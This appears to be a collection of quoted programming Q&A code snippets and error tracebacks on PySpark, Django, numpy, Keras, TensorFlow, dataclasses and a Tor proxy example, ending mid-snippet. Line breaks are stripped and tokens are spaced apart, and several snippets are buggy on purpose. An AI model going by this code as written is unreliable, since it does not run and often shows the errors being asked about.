duration|last_100_sms_outgoing_count|last_100_sms_outgoing_to_onnet_count|last_100_sms_outgoing_to_offnet_count|last_100_sms_outgoing_to_abroad_count|last_100_gprs_usage|user_intake|user_has_outgoing_calls|user_has_outgoing_sms|user_use_gprs|user_does_reload|n_months|churn|month|churn|| 0| 1031| 947.0| 0.3333333333333333|10.993333333333334| 10.3| 12.0|1.3333333333333333| 10.013333333333334| 83.66666666666667| 5.859999999999999| 55.69| 0.5966666666666667| 10.333333333333334| 0.6666666666666666| 0.0| 0.0| 0.0| 0.6666666666666666| 23.333333333333332| 2.8833333333333333| 25.0| 0.6666666666666666| 0.0| 0.0| 0.0|0.6666666666666666| 135.33333333333334| 4.44| 0.06| 0.3333333333333333| 16.333333333333332| 0.98| 0.3333333333333333| 57.666666666666664| 3.4599999999999995| 0.3333333333333333| 0.0| 0.0|0.3333333333333333| 14.0| 0.0| 0.0| 0.0| 0.0| 0.0| 0.0| 1307.0| 5.666666666666667| 22.01666666666667| 130.48| 0.0| 65.33333333333333| 0.0| 287.3333333333333| 34.0| 113.66666666666667| 0.0| 0.0| 0| 1| 1| 0| 1| 3| 9| 0|| 1| 4231| 951.0| 1.3333333333333333|27.546666666666667| 6.45| 22.0| 1.0| 12.013333333333334| 46.333333333333336| 6.45| 47.150000000000006| 1.3233333333333333| 8.81| 1.3333333333333333| 0.0| 0.0| 0.0| 1.3333333333333333| 31.666666666666668| 6.400000000000001| 42.656666666666666| 1.3333333333333333| 0.0| 0.0| 0.0|1.3333333333333333| 0.6666666666666666| 0.0| 0.0| 57.0| 0.0| 0.0| 57.0| 0.0| 0.0| 57.0| 0.0| 0.0| 57.0| 10.666666666666666| 0.0| 0.0| 0.0| 0.0| 0.0| 0.0| 1307.0| 4.0| 32.026666666666664| 156.96666666666667| 0.0| 145.42999999999998| 0.0| 1.6666666666666667| 0.0| 0.3333333333333333| 0.0| 0.0| 0| 1| 1| 0| 1| 3| 9| 0|| 2| 5231| 523.0| 0.6666666666666666| 14.62| 1.0999999999999999| 1307.0| 0.0| 0.0| 14.333333333333334| 1.0999999999999999| 7.573333333333333| 0.7266666666666666| 4.84| 0.6666666666666666| 0.0| 0.0| 0.0| 0.6666666666666666| 8.333333333333334| 0.3233333333333333| 2.1566666666666667| 0.6666666666666666| 0.0| 0.0| 0.0|0.6666666666666666| 0.0| 0.0| 0.0| 1307.0| 0.0| 0.0| 1307.0| 0.0| 0.0| 1307.0| 0.0| 0.0| 1307.0| 8.333333333333334| 0.0| 0.0| 0.0| 0.0| 0.0| 0.0| 1307.0| 0.0| 0.0| 47.330000000000005| 0.0| 10.356666666666667| 0.0| 0.0| 0.0| 0.0| 0.0| 0.0| 0| 1| 0| 0| 0| 3| 9| 0|from pyspark.ml.feature import StandardScaler , VectorAssemblerassembler = VectorAssembler ( inputCols= [ `` user_lifetime '' , `` user_no_outgoing_activity_in_days '' , `` user_account_balance_last '' , `` user_spendings '' , `` reloads_inactive_days '' , `` reloads_count '' , `` reloads_sum '' , `` calls_outgoing_count '' , `` calls_outgoing_spendings '' , `` calls_outgoing_duration '' , `` calls_outgoing_spendings_max '' , `` calls_outgoing_duration_max '' , `` calls_outgoing_inactive_days '' , `` calls_outgoing_to_onnet_count '' , `` calls_outgoing_to_onnet_spendings '' , `` calls_outgoing_to_onnet_duration '' , `` calls_outgoing_to_onnet_inactive_days '' , `` calls_outgoing_to_offnet_count '' , `` calls_outgoing_to_offnet_spendings '' , `` calls_outgoing_to_offnet_duration '' , `` calls_outgoing_to_offnet_inactive_days '' , `` calls_outgoing_to_abroad_count '' , `` calls_outgoing_to_abroad_spendings '' , `` calls_outgoing_to_abroad_duration '' , `` calls_outgoing_to_abroad_inactive_days '' , `` sms_outgoing_count '' , `` sms_outgoing_spendings '' , `` sms_outgoing_spendings_max '' , `` sms_outgoing_inactive_days '' , `` sms_outgoing_to_onnet_count '' , `` sms_outgoing_to_onnet_spendings '' , `` sms_outgoing_to_onnet_inactive_days '' , `` sms_outgoing_to_offnet_count '' , `` sms_outgoing_to_offnet_spendings '' , `` sms_outgoing_to_offnet_inactive_days '' , `` sms_outgoing_to_abroad_count '' , `` sms_outgoing_to_abroad_spendings '' , `` sms_outgoing_to_abroad_inactive_days '' , `` sms_incoming_count '' , `` sms_incoming_spendings '' , `` sms_incoming_from_abroad_count '' , `` sms_incoming_from_abroad_spendings '' , `` gprs_session_count '' , `` gprs_usage '' , `` gprs_spendings '' , `` gprs_inactive_days '' , `` last_100_reloads_count '' , `` last_100_reloads_sum '' , `` last_100_calls_outgoing_duration '' , `` last_100_calls_outgoing_to_onnet_duration '' , `` last_100_calls_outgoing_to_offnet_duration '' , `` last_100_calls_outgoing_to_abroad_duration '' , `` last_100_sms_outgoing_count '' , `` last_100_sms_outgoing_to_onnet_count '' , `` last_100_sms_outgoing_to_offnet_count '' , `` last_100_sms_outgoing_to_abroad_count '' , `` last_100_gprs_usage '' , `` user_intake '' , `` user_has_outgoing_calls '' , `` user_has_outgoing_sms '' , `` user_use_gprs '' , `` user_does_reload '' ] , outputCol= '' features '' ) scaler = StandardScaler ( withMean=True , withStd=True , inputCol= '' features '' , outputCol= '' scaled_features '' ) ca1FeaturizedDF = assembler.transform ( ca1DF ) ca1FeaturizedDF.show ( 5 ) |user_account_id|user_lifetime|user_no_outgoing_activity_in_days|user_account_balance_last| user_spendings|reloads_inactive_days| reloads_count| reloads_sum|calls_outgoing_count|calls_outgoing_spendings|calls_outgoing_duration|calls_outgoing_spendings_max|calls_outgoing_duration_max|calls_outgoing_inactive_days|calls_outgoing_to_onnet_count|calls_outgoing_to_onnet_spendings|calls_outgoing_to_onnet_duration|calls_outgoing_to_onnet_inactive_days|calls_outgoing_to_offnet_count|calls_outgoing_to_offnet_spendings|calls_outgoing_to_offnet_duration|calls_outgoing_to_offnet_inactive_days|calls_outgoing_to_abroad_count|calls_outgoing_to_abroad_spendings|calls_outgoing_to_abroad_duration|calls_outgoing_to_abroad_inactive_days|sms_outgoing_count|sms_outgoing_spendings|sms_outgoing_spendings_max|sms_outgoing_inactive_days|sms_outgoing_to_onnet_count|sms_outgoing_to_onnet_spendings|sms_outgoing_to_onnet_inactive_days|sms_outgoing_to_offnet_count|sms_outgoing_to_offnet_spendings|sms_outgoing_to_offnet_inactive_days|sms_outgoing_to_abroad_count|sms_outgoing_to_abroad_spendings|sms_outgoing_to_abroad_inactive_days|sms_incoming_count|sms_incoming_spendings|sms_incoming_from_abroad_count|sms_incoming_from_abroad_spendings|gprs_session_count|gprs_usage|gprs_spendings|gprs_inactive_days|last_100_reloads_count|last_100_reloads_sum|last_100_calls_outgoing_duration|last_100_calls_outgoing_to_onnet_duration|last_100_calls_outgoing_to_offnet_duration|last_100_calls_outgoing_to_abroad_duration|last_100_sms_outgoing_count|last_100_sms_outgoing_to_onnet_count|last_100_sms_outgoing_to_offnet_count|last_100_sms_outgoing_to_abroad_count|last_100_gprs_usage|user_intake|user_has_outgoing_calls|user_has_outgoing_sms|user_use_gprs|user_does_reload|n_months|churn|month|churn| features|| 0| 1031| 947.0| 0.3333333333333333|10.993333333333334| 10.3| 12.0|1.3333333333333333| 10.013333333333334| 83.66666666666667| 5.859999999999999| 55.69| 0.5966666666666667| 10.333333333333334| 0.6666666666666666| 0.0| 0.0| 0.0| 0.6666666666666666| 23.333333333333332| 2.8833333333333333| 25.0| 0.6666666666666666| 0.0| 0.0| 0.0|0.6666666666666666| 135.33333333333334| 4.44| 0.06| 0.3333333333333333| 16.333333333333332| 0.98| 0.3333333333333333| 57.666666666666664| 3.4599999999999995| 0.3333333333333333| 0.0| 0.0|0.3333333333333333| 14.0| 0.0| 0.0| 0.0| 0.0| 0.0| 0.0| 1307.0| 5.666666666666667| 22.01666666666667| 130.48| 0.0| 65.33333333333333| 0.0| 287.3333333333333| 34.0| 113.66666666666667| 0.0| 0.0| 0| 1| 1| 0| 1| 3| 9| 0| [ 1031.0,947.0,0.3 ... || 1| 4231| 951.0| 1.3333333333333333|27.546666666666667| 6.45| 22.0| 1.0| 12.013333333333334| 46.333333333333336| 6.45| 47.150000000000006| 1.3233333333333333| 8.81| 1.3333333333333333| 0.0| 0.0| 0.0| 1.3333333333333333| 31.666666666666668| 6.400000000000001| 42.656666666666666| 1.3333333333333333| 0.0| 0.0| 0.0|1.3333333333333333| 0.6666666666666666| 0.0| 0.0| 57.0| 0.0| 0.0| 57.0| 0.0| 0.0| 57.0| 0.0| 0.0| 57.0| 10.666666666666666| 0.0| 0.0| 0.0| 0.0| 0.0| 0.0| 1307.0| 4.0| 32.026666666666664| 156.96666666666667| 0.0| 145.42999999999998| 0.0| 1.6666666666666667| 0.0| 0.3333333333333333| 0.0| 0.0| 0| 1| 1| 0| 1| 3| 9| 0| ( 62 , [ 0,1,2,3,4,5 , ... || 2| 5231| 523.0| 0.6666666666666666| 14.62| 1.0999999999999999| 1307.0| 0.0| 0.0| 14.333333333333334| 1.0999999999999999| 7.573333333333333| 0.7266666666666666| 4.84| 0.6666666666666666| 0.0| 0.0| 0.0| 0.6666666666666666| 8.333333333333334| 0.3233333333333333| 2.1566666666666667| 0.6666666666666666| 0.0| 0.0| 0.0|0.6666666666666666| 0.0| 0.0| 0.0| 1307.0| 0.0| 0.0| 1307.0| 0.0| 0.0| 1307.0| 0.0| 0.0| 1307.0| 8.333333333333334| 0.0| 0.0| 0.0| 0.0| 0.0| 0.0| 1307.0| 0.0| 0.0| 47.330000000000005| 0.0| 10.356666666666667| 0.0| 0.0| 0.0| 0.0| 0.0| 0.0| 0| 1| 0| 0| 0| 3| 9| 0| ( 62 , [ 0,1,2,3,4,5 , ... |scalerModel = scaler.fit ( ca1FeaturizedDF ) ca1FeaturizeScaleddDF = scalerModel.transform ( ca1FeaturizedDF ) ca1FeaturizeScaleddDF.show ( 5 ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -Py4JJavaError Traceback ( most recent call last ) < ipython-input-24-4a1ada825b56 > in < module > ( ) 1 ca1FeaturizeScaleddDF = scalerModel.transform ( ca1FeaturizedDF ) -- -- > 2 ca1FeaturizeScaleddDF.show ( 5 ) /opt/apache-spark/python/pyspark/sql/dataframe.py in show ( self , n , truncate ) 255 + -- -+ -- -- -+256 `` '' '' -- > 257 print ( self._jdf.showString ( n , truncate ) ) 258 259 def __repr__ ( self ) : /opt/apache-spark/python/lib/py4j-0.9-src.zip/py4j/java_gateway.py in __call__ ( self , *args ) 811 answer = self.gateway_client.send_command ( command ) 812 return_value = get_return_value ( -- > 813 answer , self.gateway_client , self.target_id , self.name ) 814 815 for temp_arg in temp_args : /opt/apache-spark/python/pyspark/sql/utils.py in deco ( *a , **kw ) 43 def deco ( *a , **kw ) : 44 try : -- - > 45 return f ( *a , **kw ) 46 except py4j.protocol.Py4JJavaError as e : 47 s = e.java_exception.toString ( ) /opt/apache-spark/python/lib/py4j-0.9-src.zip/py4j/protocol.py in get_return_value ( answer , gateway_client , target_id , name ) 306 raise Py4JJavaError ( 307 `` An error occurred while calling { 0 } { 1 } { 2 } .\n '' . -- > 308 format ( target_id , `` . `` , name ) , value ) 309 else:310 raise Py4JError ( Py4JJavaError : An error occurred while calling o172.showString . : org.apache.spark.SparkException : Job aborted due to stage failure : Task 0 in stage 16.0 failed 1 times , most recent failure : Lost task 0.0 in stage 16.0 ( TID 20 , localhost ) : java.lang.IllegalArgumentException : Do not support vector type class org.apache.spark.mllib.linalg.SparseVectorat org.apache.spark.mllib.feature.StandardScalerModel.transform ( StandardScaler.scala:150 ) at org.apache.spark.ml.feature.StandardScalerModel $ $ anonfun $ 2.apply ( StandardScaler.scala:141 ) at org.apache.spark.ml.feature.StandardScalerModel $ $ anonfun $ 2.apply ( StandardScaler.scala:141 ) at org.apache.spark.sql.catalyst.expressions.GeneratedClass $ SpecificUnsafeProjection.apply ( Unknown Source ) at org.apache.spark.sql.execution.Project $ $ anonfun $ 1 $ $ anonfun $ apply $ 1.apply ( basicOperators.scala:51 ) at org.apache.spark.sql.execution.Project $ $ anonfun $ 1 $ $ anonfun $ apply $ 1.apply ( basicOperators.scala:49 )"
"Unhandled exception in thread started by < bound method Command.inner_run of < django.core.management.commands.runserver.Command object at 0x109c57490 > > Traceback ( most recent call last ) : File `` /Users/ApPeL/.virtualenvs/myhunt/lib/python2.7/site-packages/django/core/management/commands/runserver.py '' , line 88 , in inner_run self.validate ( display_num_errors=True ) File `` /Users/ApPeL/.virtualenvs/myhunt/lib/python2.7/site-packages/django/core/management/base.py '' , line 249 , in validate num_errors = get_validation_errors ( s , app ) File `` /Users/ApPeL/.virtualenvs/myhunt/lib/python2.7/site-packages/django/core/management/validation.py '' , line 36 , in get_validation_errors for ( app_name , error ) in get_app_errors ( ) .items ( ) : File `` /Users/ApPeL/.virtualenvs/myhunt/lib/python2.7/site-packages/django/db/models/loading.py '' , line 146 , in get_app_errors self._populate ( ) File `` /Users/ApPeL/.virtualenvs/myhunt/lib/python2.7/site-packages/django/db/models/loading.py '' , line 67 , in _populate self.write_lock.release ( ) File `` /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py '' , line 137 , in release raise RuntimeError ( `` can not release un-acquired lock '' ) RuntimeError : can not release un-acquired lock"
"get_array = udf ( lambda x : x.toArray ( ) , ArrayType ( DoubleType ( ) ) ) result3 = result2.withColumn ( 'list ' , get_array ( 'features ' ) ) result3.show ( ) net.razorvine.pickle.PickleException : expected zero arguments for construction of ClassDict ( for numpy.core.multiarray._reconstruct ) df4 = indexed.groupBy ( 'uuid ' ) .pivot ( 'name ' ) .sum ( 'fre ' ) df4 = df4.fillna ( 0 ) from pyspark.ml.feature import VectorAssembler assembler = VectorAssembler ( inputCols=df4.columns [ 1 : ] , outputCol= '' features '' ) dataset = assembler.transform ( df4 ) bk = BisectingKMeans ( k=8 , seed=2 , featuresCol= '' features '' ) result2 = bk.fit ( dataset ) .transform ( dataset ) + -- -- -- -- -- -- -- -- -- + -- -- -- -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- + -- -- +| uuid| category| code| servertime| cat| fre|catIndex|name|+ -- -- -- -- -- -- -- -- -- + -- -- -- -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- + -- -- +| 351667085527886| 398| null|1503084585000| 398|0.37951264| 2.0| a2|| 352279079643619| 403| null|1503105476000| 403| 0.3938634| 3.0| a3|| 352279071621894| 398| null|1503085396000| 398|0.38005984| 2.0| a2|| 357653074851887| 398| null|1503085552000| 398| 0.3801652| 2.0| a2|| 354287077780760| 407| null|1503085603000| 407|0.38019964| 5.0| a5||0_8f394ebf3f67597c| 403| null|1503084183000| 403|0.37924168| 3.0| a3|| 353528084062994| 403| null|1503084234000| 403|0.37927604| 3.0| a3|| 356626072993852| 100000504|100000504|1503104781000| 100000504| 0.3933774| 0.0| a0|| 351667081062615| 100000448| 398|1503083901000| 398|0.37905172| 2.0| a2|| 354330089551058|1.00000444E8| null|1503084004000|1.00000444E8|0.37912107| 34.0| a34|+ -- -- -- -- -- -- -- -- -- + -- -- -- -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- + -- -- +"
"new_picks = new_picks.astype ( int ) np.savetxt ( fname='newPicksData.txt ' , X=new_picks.astype ( int ) ) 2.900000000000000000e+01 3.290000000000000000e+02 1.000000000000000000e+004.300000000000000000e+01 1.080000000000000000e+02 1.000000000000000000e+004.300000000000000000e+01 1.950000000000000000e+02 1.000000000000000000e+005.600000000000000000e+01 1.510000000000000000e+02 1.000000000000000000e+005.600000000000000000e+01 9.700000000000000000e+01 1.000000000000000000e+007.000000000000000000e+01 2.840000000000000000e+02 1.000000000000000000e+003.500000000000000000e+01 3.170000000000000000e+02 1.000000000000000000e+005.400000000000000000e+01 2.110000000000000000e+02 1.000000000000000000e+006.400000000000000000e+01 1.180000000000000000e+02 1.000000000000000000e+005.400000000000000000e+01 3.700000000000000000e+01 1.000000000000000000e+001.300000000000000000e+01 1.950000000000000000e+02 1.000000000000000000e+001.300000000000000000e+01 1.680000000000000000e+02 1.000000000000000000e+001.300000000000000000e+01 2.780000000000000000e+02 1.000000000000000000e+004.900000000000000000e+01 2.200000000000000000e+01 1.000000000000000000e+004.900000000000000000e+01 1.040000000000000000e+02 1.000000000000000000e+004.900000000000000000e+01 7.500000000000000000e+01 1.000000000000000000e+005.400000000000000000e+01 2.610000000000000000e+02 1.000000000000000000e+005.400000000000000000e+01 2.600000000000000000e+02 1.000000000000000000e+005.400000000000000000e+01 1.150000000000000000e+02 1.000000000000000000e+005.400000000000000000e+01 5.400000000000000000e+01 1.000000000000000000e+001.300000000000000000e+01 5.400000000000000000e+01 1.000000000000000000e+004.900000000000000000e+01 5.400000000000000000e+01 1.000000000000000000e+00 29 329 143 108 143 195 156 151 156 97 1"
"# ! /usr/bin/env python2from mock import patchclass Dog ( object ) : def bark ( self ) : print ( `` Woof woof ! `` ) Dog ( ) .bark ( ) def new_method ( *args ) : print ( `` args = % s '' % str ( args ) ) Dog.bark = new_methodDog ( ) .bark ( ) with patch.object ( Dog , `` bark '' ) : d = Dog ( ) d.bark ( ) print ( `` d.bark was called : % s '' % str ( d.bark.called ) ) print ( `` d.bark was called with args/kwargs : % s '' % str ( d.bark.call_args ) ) Woof woof ! args = ( < __main__.Dog object at 0x7f42c2dbc3d0 > , ) # Mocking bitd.bark was called : Trued.bark was called with args/kwargs : ( ( ) , { } )"
"import numpy as npfrom scipy.stats import norm , lognormfrom scipy.integrate import quada = 0degrees = 50flag=-1.0000F = 1.2075K = 0.1251vol = 0.43T2 = 0.0411T1 = 0.0047def integrand ( x , flag , F , K , vol , T2 , T1 ) : d1 = ( np.log ( x / ( x+K ) ) + 0.5 * ( vol**2 ) * ( T2-T1 ) ) / ( vol * np.sqrt ( T2 - T1 ) ) d2 = d1 - vol*np.sqrt ( T2 - T1 ) mu = np.log ( F ) - 0.5 *vol **2 * T1 sigma = vol * np.sqrt ( T1 ) return lognorm.pdf ( x , mu , sigma ) * ( flag * x*norm.cdf ( flag * d1 ) - flag * ( x+K ) *norm.cdf ( flag * d2 ) ) def transform_integral_0_1_to_Infinity ( x , a ) : return integrand ( a+ ( x/ ( 1-x ) ) , flag , F , K , vol , T2 , T1 ) * ( 1/ ( 1-x ) **2 ) ; def transform_integral_negative1_1_to_0_1 ( x , a ) : return 0.5 * transform_integral_0_1_to_Infinity ( ( x+1 ) /2 , a ) def transform_integral_negative1_1_to_a_b ( x , w , a , b ) : return np.sum ( w* ( 0.5 * transform_integral_0_1_to_Infinity ( ( ( x+1 ) /2* ( b-a ) +a ) , a ) ) ) def adaptive_integration ( x , w , a=-1 , b=1 , lastsplit=False , precision=1e-10 ) : # split the integral in half assuming [ -1 , 1 ] range midpoint = ( a+b ) /2 interval1 = transform_integral_negative1_1_to_a_b ( x , w , a , midpoint ) interval2 = transform_integral_negative1_1_to_a_b ( x , w , midpoint , b ) return interval1+interval2 # just shows this is correct for splitting the intervaldef integrate ( x , w , a ) : return np.sum ( w*transform_integral_negative1_1_to_0_1 ( x , a ) ) x , w = np.polynomial.legendre.leggauss ( degrees ) quadresult = quad ( integrand , a , np.Inf , args= ( flag , F , K , vol , T2 , T1 ) , epsabs=1e-1000 ) [ 0 ] GL = integrate ( x , w , a ) print ( `` Adaptive Sum Result : '' ) print ( adaptive_integration ( x , w ) ) print ( `` GL result '' ) ; print ( GL ) print ( `` QUAD result '' ) print ( quadresult ) def adaptive_integration ( x , w , a , b , integralA2B , remainingIterations , firstIteration , precision=1e-9 ) : # split the integral in half assuming [ -1 , 1 ] range if remainingIterations == 0 : print ( 'Adaptive integration failed on the interval ' , a , '- > ' , b ) if np.isnan ( integralA2B ) : return np.nan midpoint = ( a+b ) /2 interval1 = transform_integral_negative1_1_to_a_b ( x , w , a , midpoint ) interval2 = transform_integral_negative1_1_to_a_b ( x , w , midpoint , b ) if np.abs ( integralA2B - ( interval1 + interval2 ) ) < precision : return ( interval1 + interval2 ) else : return adaptive_integration ( x , w , a , midpoint , interval1 , ( remainingIterations-1 ) , False ) + adaptive_integration ( x , w , midpoint , b , interval2 , ( remainingIterations-1 ) , False ) # This example does n't converge to Quad # non-converging interval inputsa = 0 # AND a = -250degrees = 10flag= 1F = 50K = 0.1251vol = 0.43T2 = 0.0411T1 = 0.0047print ( adaptive_integration ( x , w , -1 , 1 , GL , 500 , False ) ) GL result:60.065205169286379Adaptive Sum Result : RecursionError : maximum recursion depth exceeded in comparisonQUAD result:68.72069173210338"
"[ ( i , j ) for i , j in enumerate ( range ( 10 ) ) if ( 3 < j ) and ( j < 8 ) ] [ ( 4 , 4 ) , ( 5 , 5 ) , ( 6 , 6 ) , ( 7 , 7 ) ] [ ( 0 , 4 ) , ( 1 , 5 ) , ( 2 , 6 ) , ( 3 , 7 ) ]"
# ! /usr/bin/env pythonimport osBASE_PATH = os.path.dirname ( __file__ ) print BASE_PATH
"df = pd.read_csv ( `` ../data/training_data.csv '' ) # Group by and pivot the data group_index = df.groupby ( 'group ' ) .cumcount ( ) data = ( df.set_index ( [ 'group ' , group_index ] ) .unstack ( fill_value=0 ) .stack ( ) ) # getting np array of the data and labeling # on the label group we take the first label because it is the same for all target = np.array ( data [ 'label ' ] .groupby ( level=0 ) .apply ( lambda x : [ x.values [ 0 ] ] ) .tolist ( ) ) data = data.loc [ : , data.columns ! = 'label ' ] data = np.array ( data.groupby ( level=0 ) .apply ( lambda x : x.values.tolist ( ) ) .tolist ( ) ) # shuffel the training set data , target = shuffle ( data , target ) # spilt data to train and test x_train , x_test , y_train , y_test = train_test_split ( data , target , test_size=0.2 , random_state=4 ) # ADAM Optimizer with learning rate decay opt = optimizers.Adam ( lr=0.0001 , beta_1=0.9 , beta_2=0.999 , epsilon=1e-08 , decay=0.0001 ) # build the model model = Sequential ( ) num_features = data.shape [ 2 ] num_samples = data.shape [ 1 ] model.add ( LSTM ( 8 , batch_input_shape= ( None , num_samples , num_features ) , return_sequences=True , activation='sigmoid ' ) ) model.add ( LeakyReLU ( alpha=.001 ) ) model.add ( Dropout ( 0.2 ) ) model.add ( LSTM ( 4 , return_sequences=True , activation='sigmoid ' ) ) model.add ( LeakyReLU ( alpha=.001 ) ) model.add ( Flatten ( ) ) model.add ( Dense ( 1 , activation='sigmoid ' ) ) model.compile ( loss='binary_crossentropy ' , optimizer=opt , metrics= [ 'accuracy ' , keras_metrics.precision ( ) , keras_metrics.recall ( ) , f1 ] ) model.summary ( ) # Training , getting the results history for plotting history = model.fit ( x_train , y_train , epochs=3000 , validation_data= ( x_test , y_test ) )"
"`` `` '' An indexable , ordered set of objects , which are held by weak reference . `` `` '' from nose.tools import *import blistimport weakrefclass WeakOrderedSet ( blist.weaksortedset ) : `` '' '' A blist.weaksortedset whose key is the insertion order. `` '' '' def __init__ ( self , iterable= ( ) ) : self.insertion_order = weakref.WeakKeyDictionary ( ) # value_type to int self.last_key = 0 super ( ) .__init__ ( key=self.insertion_order.__getitem__ ) for item in iterable : self.add ( item ) def __delitem__ ( self , index ) : values = super ( ) .__getitem__ ( index ) super ( ) .__delitem__ ( index ) if not isinstance ( index , slice ) : # values is just one element values = [ values ] for value in values : if value not in self : del self.insertion_order [ value ] def add ( self , value ) : # Choose a key so that value is on the end . if value not in self.insertion_order : key = self.last_key self.last_key += 1 self.insertion_order [ value ] = key super ( ) .add ( value ) def discard ( self , value ) : super ( ) .discard ( value ) if value not in self : del self.insertion_order [ value ] def remove ( self , value ) : super ( ) .remove ( value ) if value not in self : del self.insertion_order [ value ] def pop ( self , *args , **kwargs ) : value = super ( ) .pop ( *args , **kwargs ) if value not in self : del self.insertion_order [ value ] def clear ( self ) : super ( ) .clear ( ) self.insertion_order.clear ( ) def update ( self , *args ) : for arg in args : for item in arg : self.add ( item ) if __name__ == '__main__ ' : class Dummy : def __init__ ( self , value ) : self.value = value x = [ Dummy ( i ) for i in range ( 10 ) ] w = WeakOrderedSet ( reversed ( x ) ) del w [ 2:8 ] assert_equals ( [ 9,8,1,0 ] , [ i.value for i in w ] ) del w [ 0 ] assert_equals ( [ 8,1,0 ] , [ i.value for i in w ] ) del x assert_equals ( [ ] , [ i.value for i in w ] )"
"list1 = [ ' a ' , ' e ' , 't ' , ' b ' , ' c ' ] list2 = [ ' e ' , ' b ' , ' a ' , ' c ' , ' n ' , 's ' ]"
"@ app.route ( '/ ' ) @ decodef index ( ) : return 'Hello world ' class CustomFlask ( Flask ) : jinja_options = ... app = CustomFlask ( __name__ , ... )"
"F : \gitp4 > c : \Python27\python.exe git-p4.py clone -- destination=master //depot/quake/main/ ... @ allReading pipe : git config git-p4.syncFromOriginImporting from //depot/quake/main/ ... @ all into masterInitialized empty Git repository in F : /gitp4/master/.git/Traceback ( most recent call last ) : File `` git-p4.py '' , line 1926 , in < module > main ( ) File `` git-p4.py '' , line 1921 , in main if not cmd.run ( args ) : File `` git-p4.py '' , line 1798 , in run if not P4Sync.run ( self , depotPaths ) : File `` git-p4.py '' , line 1501 , in run self.hasOrigin = originP4BranchesExist ( ) File `` git-p4.py '' , line 439 , in originP4BranchesExist return gitBranchExists ( `` origin '' ) or gitBranchExists ( `` origin/p4 '' ) or gitBranchExists ( `` origin/p4/master '' ) File `` git-p4.py '' , line 332 , in gitBranchExists stderr=subprocess.PIPE , stdout=subprocess.PIPE ) ; File `` c : \Python27\lib\subprocess.py '' , line 672 , in __init__ errread , errwrite ) File `` c : \Python27\lib\subprocess.py '' , line 882 , in _execute_child startupinfo ) WindowsError : [ Error 2 ] The system can not find the file specified"
"import tensorflow as tftf.InteractiveSession ( ) A = [ [ 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 1 , 0 , 0 ] , [ 0 , 0 , 0 , 1 , 1 , 1 , 0 ] , [ 0 , 0 , 0 , 0 , 1 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ] kernel = tf.ones ( ( 3,3,1 ) ) input4D = tf.cast ( tf.expand_dims ( tf.expand_dims ( A , -1 ) , 0 ) , tf.float32 ) output4D = tf.nn.dilation2d ( input4D , filter=kernel , strides= ( 1,1,1,1 ) , rates= ( 1,1,1,1 ) , padding= '' SAME '' ) print ( tf.cast ( output4D [ 0 , : , :,0 ] , tf.int32 ) .eval ( ) ) array ( [ [ 1 , 1 , 1 , 2 , 2 , 2 , 1 ] , [ 1 , 1 , 2 , 2 , 2 , 2 , 2 ] , [ 1 , 1 , 2 , 2 , 2 , 2 , 2 ] , [ 1 , 1 , 2 , 2 , 2 , 2 , 2 ] , [ 1 , 1 , 1 , 2 , 2 , 2 , 1 ] , [ 1 , 1 , 1 , 1 , 1 , 1 , 1 ] ] , dtype=int32 ) array ( [ [ 0 , 0 , 0 , 1 , 1 , 1 , 0 ] , [ 0 , 0 , 1 , 1 , 1 , 1 , 1 ] , [ 0 , 0 , 1 , 1 , 1 , 1 , 1 ] , [ 0 , 0 , 1 , 1 , 1 , 1 , 1 ] , [ 0 , 0 , 0 , 1 , 1 , 1 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ] , dtype=int32 )"
unsigned char load ( char const *FileName ) def test ( ) : PATH = '/usr/lib/libnx.so ' PATH = < char* > PATH load ( PATH )
"def get_all_substrings ( input_string ) : length = len ( input_string ) return [ input_string [ i : j+1 ] for i in range ( length ) for j in range ( i , length ) ]"
"import copyimport dataclasses @ dataclasses.dataclassclass Demo : a_number : int a_bool : bool classy : 'YOhY ' def my_tuple ( self ) : return self.a_number , self.a_bool , self.classyclass YOhY : def __repr__ ( self ) : return ( self.__class__.__qualname__ + f '' id= { id ( self ) } '' ) why = YOhY ( ) print ( why ) # YOhY id=4369078368demo = Demo ( 1 , True , why ) print ( demo ) # Demo ( a_number=1 , a_bool=True , classy=YOhY id=4369078368 ) untrupled = demo.my_tuple ( ) print ( untrupled ) # YOhY id=4369078368trupled = dataclasses.astuple ( demo ) print ( trupled ) # YOhY id=4374460064trupled2 = trupledprint ( trupled2 ) # YOhY id=4374460064trupled3 = copy.copy ( trupled ) print ( trupled3 ) # YOhY id=4374460064trupled4 = copy.deepcopy ( trupled ) print ( trupled4 ) # YOhY id=4374460176 def unsafe_astuple ( self ) : return tuple ( [ self.__dict__ [ field.name ] for field in dataclasses.fields ( self ) ] )"
"from io import StringIOimport socketimport urllib3import timeimport socks # SocksiPy moduleimport stem.processfrom stem.util import termSOCKS_PORT = 9150 # Set socks proxy and wrap the urllib modulesocks.setdefaultproxy ( socks.PROXY_TYPE_SOCKS5 , '127.0.0.1 ' , SOCKS_PORT ) socket.socket = socks.socksocket # Perform DNS resolution through the socketdef getaddrinfo ( *args ) : return [ ( socket.AF_INET , socket.SOCK_STREAM , 6 , `` , ( args [ 0 ] , args [ 1 ] ) ) ] socket.getaddrinfo = getaddrinfodef query ( url ) : `` '' '' Uses urllib to fetch a site using SocksiPy for Tor over the SOCKS_PORT. `` '' '' try : return urllib3.urlopen ( url ) .read ( ) except : return `` Unable to reach % s '' % url # Start an instance of Tor configured to only exit through Russia . This prints # Tor 's bootstrap information as it starts . Note that this likely will not # work if you have another Tor instance running.def print_bootstrap_lines ( line ) : if `` Bootstrapped `` in line : print ( term.format ( line , term.Color.BLUE ) ) print ( term.format ( `` Starting Tor : \n '' , term.Attr.BOLD ) ) tor_process = stem.process.launch_tor_with_config ( tor_cmd = `` C : \Tor Browser\Browser\TorBrowser\Tor\\tor.exe '' , config = { 